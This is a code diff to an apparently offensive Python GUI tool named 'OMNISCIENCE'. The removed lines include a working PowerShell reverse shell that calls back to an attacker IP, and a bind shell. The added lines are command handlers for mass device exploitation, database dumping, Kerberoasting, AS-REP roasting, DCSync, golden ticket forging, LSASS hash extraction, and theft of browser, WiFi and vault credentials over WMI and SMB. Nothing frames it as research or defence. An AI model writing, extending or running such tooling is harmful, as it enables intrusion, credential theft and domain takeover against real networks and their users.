+        """Automated exploitation of all discovered devices"""
+        if not self.engine:
+            return "[!] Engine unavailable"
         
-        key = args[0]
-        value = args[1] if len(args) > 1 else ""
+        # Use AMMO v2 for mass exploitation
+        self._log("[!] Launching mass attack sequence...")
+        results = self.engine.pwn_all()
         
-        result = self.run_command(f'reg query "{key}" {value}')
-        return result
-
-    def list_services(self, args):
-        return self.run_command("net start")
-
-    def start_service(self, args):
-        if not args:
-            return "Usage: start_service <service_name>"
+        output = f"[+] Exploitation complete!\n"
+        output += f"[+] Exploited: {len(results['exploited'])}\n"
+        output += f"[-] Failed: {len(results['failed'])}\n\n"
         
-        svc = args[0]
-        result = self.run_command(f"net start {svc}")
-        return result
-
-    def stop_service(self, args):
-        if not args:
-            return "Usage: stop_service <service_name>"
+        for exp in results['exploited']:
+            output += f"  [+] {exp['ip']} - {exp['method']} ({exp['os']})\n"
         
-        svc = args[0]
-        result = self.run_command(f"net stop {svc}")
-        return result
-
-    def pivot(self, args):
-        if not args:
-            return "Usage: pivot <session_id>"
-        
-        sid = args[0]
-        if sid in self.sessions:
-            self.current_target = self.sessions[sid].get('ip')
-            return f"[*] Pivoting through session {sid}"
-        return f"Session {sid} not found"
-
-    def port_forward(self, args):
+        return output
+    
+    def dump_database(self, args):
+        """Dump database contents"""
         if len(args) < 2:
-            return "Usage: portfwd <local_port> <remote_port>"
-        
-        lport = args[0]
-        rport = args[1]
-        
-        return f"[*] Setting up port forward: 0.0.0.0:{lport} -> {self.current_target}:{rport}"
-
-    def reverse_shell(self, args):
-        ip = args[0] if len(args) > 0 else "attacker_ip"
-        port = args[1] if len(args) > 1 else "4444"
-        
-        payload = """
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($n=$s.Read($b,0,$b.Length))-gt0){{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$n);$p=(Invoke-Expression $d 2>&1|Out-String);$b=[System.Text.Encoding]::ASCII.GetBytes($p+$('PS '+(Get-Location).Path+'> '));$s.Write($b,0,$b.Length)}}"
-""".format(ip=ip, port=port)
-        
-        return f"[*] Reverse shell payload generated:\n{payload}"
-
-    def bind_shell(self, args):
-        port = args[0] if args else "4444"
-        
-        payload = f'powershell -NoProfile -ExecutionPolicy Bypass -Command "$l=Listen-Port -Port {port};while($c=$l.Accept()){{$b=0..65535|%{{0}};while(($n=$c.Read($b,0,$b.Length))-gt0){{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$n);$p=(Invoke-Expression $d 2>&1|Out-String);$c.Write([System.Text.Encoding]::ASCII.GetBytes($p),0,$p.Length)}};$c.Close()}}"'
-        
-        return f"[*] Bind shell payload generated:\n{payload}"
-
-    # Message/Chat functionality
-    def send_message(self, args):
-        if len(args) < 2:
-            return "Usage: msg <target_ip> <message>"
+            return "Usage: dbdump <ip> <db_type> [port]"
         
         target = args[0]
-        message = " ".join(args[1:])
+        db_type = args[1]
+        port = int(args[2]) if len(args) > 2 else None
         
-        # In a real implementation, this would send via network
-        # For now, simulate message storage
-        if not hasattr(self, 'messages'):
-            self.messages = []
-            
-        self.messages.append({
-            'to': target,
-            'from': 'self',
-            'message': message,
-            'time': datetime.now().strftime("%H:%M:%S"),
-            'status': 'sent'
-        })
+        if not self.control: return "[!] Control engine unavailable"
         
-        return f"[*] Message sent to {target}: {message}"
-
-    def show_inbox(self):
-        if not hasattr(self, 'messages') or not self.messages:
-            return "No messages in inbox."
+        result = self.control.full_database_dump(target, port, db_type)
         
-        result = "╔═══════════════════════════════════════════════════════════╗\n"
-        result += "║                       INBOX                                ║\n"
-        result += "╠═══════════════════════════════════════════════════════════╣\n"
-        
-        for msg in self.messages:
-            result += f"║ From: {msg['from']:<10s} To: {msg['to']:<15s}\n"
-            result += f"║ {msg['message']}\n"
-            result += f"║ Time: {msg['time']}  Status: {msg['status']}\n"
-            result += "║ ─────────────────────────────────────────────────────────\n"
-            
-        result += "╚═══════════════════════════════════════════════════════════╝"
-        return result
-
-    def broadcast(self, args):
+        if result["success"]:
+            output = f"[+] Database dump successful!\n"
+            output += f"[+] Databases: {result['databases']}\n"
+            output += f"[+] Tables: {len(result['tables'])}\n"
+            output += f"[+] Rows extracted: {result['total_rows']}\n"
+            return output
+        else:
+            return f"[-] Database dump failed: {result.get('error', 'Unknown error')}"
+    
+    # ==================== KERBEROS ATTACKS ====================
+    
+    def kerberoast_attack(self, args):
+        """Kerberoasting attack"""
         if not args:
-            return "Usage: broadcast <message>"
+            return "Usage: kerberoast <dc_ip> [domain]"
         
-        message = " ".join(args)
+        dc_ip = args[0]
+        domain = args[1] if len(args) > 1 else "DOMAIN.LOCAL"
         
-        if not hasattr(self, 'messages'):
-            self.messages = []
-            
-        # Broadcast to all sessions
-        for sid, sess in self.sessions.items():
-            self.messages.append({
-                'to': sess.get('ip', 'all'),
-                'from': 'broadcast',
-                'message': message,
-                'time': datetime.now().strftime("%H:%M:%S"),
-                'status': 'sent'
-            })
+        if not self.control: return "[!] Control engine unavailable"
+        result = self.control.kerberoast(dc_ip, domain)
         
-        return f"[*] Message broadcast to {len(self.sessions)} sessions: {message}"
+        if result.get("success"):
+            output = f"[+] Kerberoasting successful!\n"
+            output += f"[+] SPNs found: {result.get('spn_count', 0)}\n"
+            for spn in result['spn_found']:
+                output += f"  - {spn['spn']}\n"
+            return output
+        return f"[-] Kerberoasting failed: {result.get('error', 'Unknown')}"
+    
+    def asreproast_attack(self, args):
+        """AS-REP roasting attack"""
+        if not args:
+            return "Usage: asreproast <dc_ip> [domain]"
+        
+        dc_ip = args[0]
+        domain = args[1] if len(args) > 1 else "DOMAIN.LOCAL"
+        
+        if not self.control: return "[!] Control engine unavailable"
+        result = self.control.asreproast(dc_ip, domain)
+        
+        if result.get("success"):
+            output = f"[+] AS-REP roasting successful!\n"
+            output += f"[+] Users with no pre-auth: {result.get('vulnerable_users', [])}\n"
+            return output
+        return f"[-] AS-REP roasting failed: {result.get('error', 'Unknown')}"
+    
+    def dcsync_attack(self, args):
+        """DCSync attack to dump domain credentials"""
+        if len(args) < 3:
+            return "Usage: dcsync <dc_ip> <username> <password> [domain]"
+        
+        dc_ip = args[0]
+        username = args[1]
+        password = args[2]
+        domain = args[3] if len(args) > 3 else "DOMAIN.LOCAL"
+        
+        if not self.control: return "[!] Control engine unavailable"
+        result = self.control.dcsync(dc_ip, username, password, domain=domain)
+        
+        if result.get("success"):
+            return f"[+] DCSync replication initiated. Method: {result.get('method')}"
+        return f"[-] DCSync failed: {result.get('error', 'Unknown')}"
+    
+    def golden_ticket_attack(self, args):
+        """Create golden ticket for domain persistence"""
+        if len(args) < 4:
+            return "Usage: golden <domain> <sid> <krbtgt_hash> [username]"
+        
+        domain = args[0]
+        sid = args[1]
+        krbtgt_hash = args[2]
+        username = args[3] if len(args) > 3 else "Administrator"
+        
+        if not self.control: return "[!] Control engine unavailable"
+        path = self.control.golden_ticket(domain, sid, krbtgt_hash, username)
+        
+        if path:
+            return f"[+] Golden ticket forged and saved to: {path}"
+        return "[-] Golden ticket creation failed."
+    
+    # ==================== CREDENTIAL HARVESTING ====================
+    
+    def dump_lsass(self, args):
+        """Dump LSASS memory for credential extraction"""
+        target = args[0] if args else self.current_target
+        if not target: return "Usage: lsass <ip>"
+        
+        username = args[1] if len(args) > 1 else self.credentials.get(target, {}).get('user', 'Administrator')
+        password = args[2] if len(args) > 2 else self.credentials.get(target, {}).get('pass', '')
+        
+        if not self.control: return "[!] Control engine unavailable"
+        result = self.control.lsass_extract_hashes(target, username, password)
+        
+        if result.get("success"):
+            output = f"[+] LSASS extraction successful!\n"
+            for entry in result.get('hashes', []):
+                output += f"  {entry['user']}:{entry['ntlm']}\n"
+            return output
+        return f"[-] LSASS dump failed: {result.get('error', 'Unknown')}"
+    
+    def harvest_browser(self, args):
+        """Harvest browser saved credentials"""
+        target = args[0] if args else self.current_target
+        if not target: return "Usage: browser <ip>"
+        
+        username = self.credentials.get(target, {}).get('user', 'Administrator')
+        password = self.credentials.get(target, {}).get('pass', '')
+        
+        if not self.control: return "[!] Control engine unavailable"
+        result = self.control.get_browser_passwords(target, username, password)
+        
+        if result.get("passwords"):
+            output = f"[+] Browser credentials harvested:\n"
+            for cred in result['passwords']:
+                output += f"  {cred['browser']}: {cred['url']} -> {cred['user']}\n"
+            return output
+        return "[-] Browser credential harvest yielded no results or failed."
+    
+    def harvest_wifi(self, args):
+        """Harvest WiFi passwords"""
+        target = args[0] if args else self.current_target
+        if not target: return "Usage: wifi <ip>"
+        
+        username = self.credentials.get(target, {}).get('user', 'Administrator')
+        password = self.credentials.get(target, {}).get('pass', '')
+        
+        if not self.control: return "[!] Control engine unavailable"
+        result = self.control.get_wifi_passwords(target, username, password)
+        
+        if result.get("networks"):
+            output = f"[+] WiFi passwords harvested:\n"
+            for ssid, pw in result['networks'].items():
+                output += f"  {ssid}: {pw}\n"
+            return output
+        return "[-] WiFi password harvest yielded no results or failed."
+    
+    def harvest_vault(self, args):
+        """Harvest vault and token data"""
+        target = args[0] if args else self.current_target
+        if not target: return "Usage: vault <ip>"
+        
+        username = self.credentials.get(target, {}).get('user', 'Administrator')
+        password = self.credentials.get(target, {}).get('pass', '')
+        
+        if not self.control: return "[!] Control engine unavailable"
+        result = self.control.extract_all_data(target, username, password)
+        
+        output = f"[+] Deep harvest completed on {target}.\n"
+        output += f"  - Credentials: {len(result.get('credentials', {}).get('passwords', []))}\n"
+        output += f"  - WiFi: {len(result.get('wifi', {}).get('networks', {}))}\n"
+        output += f"  - Hashes: {len(result.get('hashes', {}).get('hashes', []))}\n"
+        return output
+    
+    def wmi_exec(self, args):
+        """Execute command via WMI"""
+        if not args:
+            return "Usage: exec <command>"
+        
+        if not self.current_target:
+            return "No target set"
+        
+        cmd = " ".join(args)
+        username = self.credentials.get(self.current_target, {}).get('user', 'Administrator')
+        password = self.credentials.get(self.current_target, {}).get('pass', '')
+        
+        if not self.control: return "[!] Control unavailable"
+        result = self.control.wmi_exec(self.current_target, username, password, cmd)
+        return f"[{self.current_target}] {cmd}\n{result.get('output', 'Command initiated.')}"
+    
+    # ==================== SMB FILE OPERATIONS ====================
+    
+    def smb_list(self, args):
+        """List files via SMB"""
+        remote_path = args[0] if args else "*"
+        if not self.current_target:
+            return "Usage: ls <remote_path> or set target first"
+        
+        username = self.credentials.get(self.current_target, {}).get('user', 'Administrator')
+        password = self.credentials.get(self.current_target, {}).get('pass', '')
+        
+        if not self.control: return "[!] Control unavailable"
+        result = self.control.smb_list(self.current_target, "C$", remote_path, username, password)
+        
+        if result:
+            output = f"[+] Directory listing of {remote_path}:\n"
+            for f in result:
+                output += f"  {'[D]' if f['dir'] else '   '} {f['name']:<30} {f['size']}\n"
+            return output
+        return "[-] SMB list failed or returned no files."
+    
+    def smb_read(self, args):
+        """Read file via SMB"""
+        if not args:
+            return "Usage: cat <remote_path>"
+        
+        if not self.current_target:
+            return "No target set"
+        
+        remote_path = args[0]
+        username = self.credentials.get(self.current_target, {}).get('user', 'Administrator')
+        password = self.credentials.get(self.current_target, {}).get('pass', '')
+        
+        if not self.control: return "[!] Control unavailable"
+        result = self.control.smb_read_file(self.current_target, "C$", remote_path, username, password)
+        
+        if result:
+            return f"[+] Content of {remote_path}:\n{result.decode(errors='replace')}"
+        return f"[-] SMB read failed for {remote_path}."
+    
+    def _log(self, msg):
+        if self.gui_callback: self.gui_callback(msg)
 
 
 # ==================== ADVANCED EXTERNAL TERMINAL ====================
@@ -1045,7 +758,7 @@ class AdvancedTerminalWindow(QMainWindow):
         # Welcome Sequence
         self.display.append(f"<font color='{PURPLE}'><b>OMNISCIENCE ADVANCED TERMINAL v2.0</b></font>")
         self.display.append(f"<font color='{ACCENT}'><b>[GEMINI]</b></font> <font color='#666680'>Cloning interface from localized imaging assets...</font>")
-        self.display.append(self.cli.show_help())
+        self.display.append(self.cli.get_banner())
         self.display.append(f"\n<font color='{SUCCESS}'>[READY] system is responsive.</font>\n")
 
     def apply_theme(self):
@@ -2240,7 +1953,7 @@ class OmniscienceProGUI(QMainWindow):
         self.network_scene = NetworkGraphicsScene()
         self.command_history = []
         self.history_index = -1
-        self.cli = CLIManager(self.cli_output_callback)
+        self.cli = CLIManager(self.log_activity)
         
         # Message server
         self.msg_server = MessageServer()
@@ -3921,15 +3634,11 @@ class OmniscienceProGUI(QMainWindow):
             self.cli_output.clear()
         elif result == "EXIT":
             self.close()
-        elif result:
+        else:
             self.cli_output.append(result)
         
         # Scroll to bottom
         self.cli_output.verticalScrollBar().setValue(self.cli_output.verticalScrollBar().maximum())
-
-    def cli_output_callback(self, text):
-        """Callback for CLI output"""
-        self.cli_output.append(text)
 
     def show_cli_help(self):
         """Show CLI help"""
@@ -4169,6 +3878,8 @@ class OmniscienceProGUI(QMainWindow):
         """Clean up on close"""
         if hasattr(self, 'msg_server'):
             self.msg_server.stop()
+        if hasattr(self, 'cli') and hasattr(self.cli, 'intel'):
+            self.cli.intel.stop_sniffing()
         event.accept()
 
 
